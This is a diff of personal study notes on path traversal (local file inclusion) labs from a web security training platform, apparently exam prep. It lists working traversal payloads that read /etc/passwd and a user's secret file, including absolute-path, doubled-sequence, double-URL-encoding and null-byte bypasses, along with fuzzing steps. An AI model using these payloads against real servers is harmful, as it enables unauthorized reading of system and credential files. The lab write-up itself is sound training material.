@@ -1,4 +1,4 @@
-## Stage 3
+### Stage 3
 ### What is it?
 Local File Inclusion. But path traversal aka directory traversal enable an attacker to read arbitrary files on the server. Could also write files. 
 
@@ -21,29 +21,29 @@ Use on `GET /image?filename=`
 
 ### Identify Vulnerabilities (Automated)
 Note: Add the fuzzing path traversal payload from drop-down list option, _**Add from list ...**_. Then set processing rule on the provided payload to replace the FILE place holder with reg-ex `\{FILE\}` for each of the attacks. Then change to `/home/carlos/secret`. If got 403, use 403bypasser and [Path Traversal Authz](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main?tab=readme-ov-file#path-traversal-authz) (see below).
-![485](LFI-20260220155958631.png)
+![[LFI-20260220155958631.png|485]]
 
 ### Identify Vulnerabilities (Manual)
 - `GET /image?filename=../../../home/carlos/secret`
 	- 200 OK
-		- [LFI](LFI.md#3.1.%20Lab%20File%20path%20traversal%2C%20simple%20case%20%E2%AD%95%EF%B8%8F)
+		- [[LFI#3.1. Lab File path traversal, simple case ⭕️]]
 	- "No such file"
 		- **Solution:** `GET /image?filename=/home/carlos/secret`
-			- [LFI](LFI.md#3.2.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20blocked%20with%20absolute%20path%20bypass%20%E2%AD%95%EF%B8%8F)
+			- [[LFI#3.2. Lab File path traversal, traversal sequences blocked with absolute path bypass ⭕️]]
 		- **Solutions**
 			- `GET /image?filename=..././..././..././home/carlos/secret`
 			- `GET /image?filename=....//....//....//home/carlos/secret`
-				- [LFI](LFI.md#3.3.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20non-recursively%20%E2%AD%95%EF%B8%8F)
+				- [[LFI#3.3. Lab File path traversal, traversal sequences stripped non-recursively ⭕️]]
 		- **Solutions**
 			- `GET /image?filename=..%252f..%252f..%252fhome/carlos/secret`
 			- `GET /image?filename=..%25%32%66..%25%32%66..%25%32%66home/carlos/secret`
 			- Double encode using cyberchef (check lab)
-				- [LFI](LFI.md#3.4.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20with%20superfluous%20URL-decode%20%E2%AD%95%EF%B8%8F)
+				- [[LFI#3.4. Lab File path traversal, traversal sequences stripped with superfluous URL-decode ⭕️]]
 		- **Solution:** `GET /image?filename=../../../home/carlos/secret%00.png`
-			- [LFI](LFI.md#3.6.%20Lab%20File%20path%20traversal%2C%20validation%20of%20file%20extension%20with%20null%20byte%20bypass%20%E2%AD%95%EF%B8%8F)
+			- [[LFI#3.6. Lab File path traversal, validation of file extension with null byte bypass ⭕️]]
 	- "Missing parameter 'filename'" OR `/var/www/images/1.jpg`
 		- `GET image?filename=/var/www/images/../../../home/carlos/secret`
-			- [LFI](LFI.md#3.5.%20Lab%20File%20path%20traversal%2C%20validation%20of%20start%20of%20path%20%E2%9C%94%EF%B8%8F)
+			- [[LFI#3.5. Lab File path traversal, validation of start of path ⭕️
 
 Can try these too
 ```
@@ -72,7 +72,7 @@ This lab contains a path traversal vulnerability in the display of product image
 To solve the lab, retrieve the contents of the `/etc/passwd` file.
 1. Click view details > right click on image and open image in new tab > *make sure filter settings have images enabled* > send the `GET /image?filename` request to Repeater.
 2. Replace that with `GET /image?filename=../../../etc/passwd` and solved.
-	1. ![LFI-20260115173137533](LFI-20260115173137533.png)
+	1. ![[LFI-20260115173137533.png]]
 >[!tip] How to Identify this Vulnerability?
 >1. `GET` request referencing a file like an image `/image?filename=`
 
@@ -84,18 +84,18 @@ The application blocks traversal sequences but treats the supplied filename as b
 
 To solve the lab, retrieve the contents of the `/etc/passwd` file.
 1. Follow Step 2 of Lab 1 will get us an error: "No such file"
-	1. ![LFI-20260115173443832](LFI-20260115173443832.png)
+	1. ![[LFI-20260115173443832.png]]
 2. Enter this to solve: `GET /image?filename=/etc/passwd`. Notice the difference is we didn't need `../../../`
-	1. ![LFI-20260115173602520](LFI-20260115173602520.png)
+	1. ![[LFI-20260115173602520.png]]
 ---
 #### 3.3. Lab: File path traversal, traversal sequences stripped non-recursively ⭕️
 This lab contains a path traversal vulnerability in the display of product images.
 The application strips path traversal sequences from the user-supplied filename before using it.
 To solve the lab, retrieve the contents of the `/etc/passwd` file.
 1. Following steps from Lab 2 will get us "No such file" error
-	1. ![485](LFI-20260115173857065.png)
+	1. ![[LFI-20260115173857065.png|485]]
 2. To solve, just double the `.` and `/` like `....//....//....//etc/passwd` and solve.
-	1. ![LFI-20260115174056658](LFI-20260115174056658.png)
+	1. ![[LFI-20260115174056658.png]]
 ---
 #### 3.4. Lab: File path traversal, traversal sequences stripped with superfluous URL-decode ⭕️
 This lab contains a path traversal vulnerability in the display of product images.
@@ -105,7 +105,7 @@ The application blocks input containing path traversal sequences. It then perfor
 To solve the lab, retrieve the contents of the `/etc/passwd` file.
 1. Following the solutions from previous labs gets an error.
 2. To solve, enter this payload: `..%252f..%252f..%252fetc/passwd`. *The `/` character is superfluous URL encoded*. Meaning the `%` in `%2f` gets URL encoded into `%25` which gets us `%252f`.
-	1. ![LFI-20260115174453750](LFI-20260115174453750.png)
+	1. ![[LFI-20260115174453750.png]]
 
 **Use in exam**
 >This, `..%25%32%66..%25%32%66..%25%32%66etc/passwd`, also works. *The `/` character is double URL encoded.* 
@@ -126,7 +126,7 @@ The application transmits the full file path via a request parameter, and valida
 To solve the lab, retrieve the contents of the `/etc/passwd` file.
 1. Notice the request has the full file path: `/var/www/images/1.jpg` instead of just `1.jpg`
 2. Replace `1.jpg` with `../../../etc/passwd` to solve.
-	1. ![LFI-20260115175851917](LFI-20260115175851917.png)
+	1. ![[LFI-20260115175851917.png]]
 >[!tip] How to Identify this Vulnerability?
 >1. `GET` request referencing a file like an image `/image?filename=
 >2. References the full file path instead of just the filename
@@ -139,7 +139,7 @@ The application validates that the supplied filename ends with the expected file
 
 To solve the lab, retrieve the contents of the `/etc/passwd` file.
 1. Add a null byte `%00` and the expected file extension `.png` to solve: `../../../etc/passwd%00.png`.
-![LFI-20260115175535252](LFI-20260115175535252.png)
+![[LFI-20260115175535252.png]]
 
 
 
